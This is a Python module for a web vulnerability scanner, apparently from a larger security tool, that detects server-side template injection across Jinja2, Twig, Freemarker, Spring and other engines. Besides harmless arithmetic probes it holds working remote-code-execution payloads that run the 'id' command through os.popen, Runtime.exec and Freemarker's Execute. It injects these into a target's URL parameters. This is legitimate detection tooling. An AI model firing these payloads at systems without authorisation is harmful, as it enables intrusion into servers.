"""
SSTI (Server-Side Template Injection) Vulnerability Scanner
Detects template injection in various engines: Jinja2, Twig, Freemarker, Velocity, Smarty, etc.
"""
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.core.http_client import get_client


class SSTIDetector(BaseScanner):
    name = "服务端模板注入漏洞"
    description = "检测目标是否存在SSTI漏洞，攻击者可注入模板表达式实现RCE或信息泄露"
    category = "ssti"
    module = "ssti_detector"
    risk_level = "critical"
    risk_score = 90
    cve_ids = []
    references = [
        "https://portswigger.net/research/server-side-template-injection",
        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
    ]
    fix_suggestion = "避免在模板中直接渲染用户输入，使用沙箱环境执行模板，对用户输入进行严格过滤。"

    SSTI_PAYLOADS = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${7*7}", "49", "Freemarker"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("<%= 7*7 %>", "49", "ERB"),
        ("#{7*7}", "49", "Pug/Jade"),
        ("${{7*7}}", "49", "Golang"),
        ("{{= 7*7 }}", "49", "Dust.js"),
        ("{@7*7}", "49", "Razor"),
        ("[[7*7]]", "49", "Various"),
        ("{{config}}", "", "Flask/Jinja2"),
        ("{{self}}", "", "Jinja2"),
        ("{{request}}", "", "Flask"),
        ("${class}", "", "Spring/Thymeleaf"),
        ("{{_self}}", "", "Twig"),
        ("{{app}}", "", "Flask"),
    ]

    SSTI_RCE_PAYLOADS = [
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "Jinja2"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess", "Jinja2"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "", "Spring"),
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "", "Twig"),
        ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid=", "Freemarker"),
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()

    def _inject_payload(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            injected = {}
            for key in params:
                injected[key] = [payload]
            new_query = urllib.parse.urlencode(injected, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(query=new_query))
        return f"{url}?q={urllib.parse.quote(payload)}"

    def check(self) -> bool:
        found_any = False

        for payload, indicator, engine in self.SSTI_PAYLOADS:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=10)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    if indicator and indicator in text:
                        found_any = True
                        self.add_result(
                            name=f"服务端模板注入漏洞 (SSTI) - {engine}",
                            target_url=self.target,
                            description=f"检测到{engine}模板注入漏洞，攻击者可执行任意代码或读取敏感信息。",
                            detail=f"Payload: {payload}\n响应中包含计算结果: {indicator}\n模板引擎: {engine}",
                            payload=payload,
                            evidence=text[:500],
                        )
                        return True
            except Exception:
                continue

        for payload, indicator, engine in self.SSTI_RCE_PAYLOADS:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=10)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    if indicator and indicator in text:
                        found_any = True
                        self.add_result(
                            name=f"SSTI远程代码执行 - {engine}",
                            target_url=self.target,
                            description=f"检测到{engine}模板注入漏洞，已确认可实现远程代码执行。",
                            detail=f"RCE Payload: {payload}\n命令执行结果已确认。",
                            payload=payload,
                            evidence=text[:500],
                        )
                        return True
            except Exception:
                continue

        return found_any
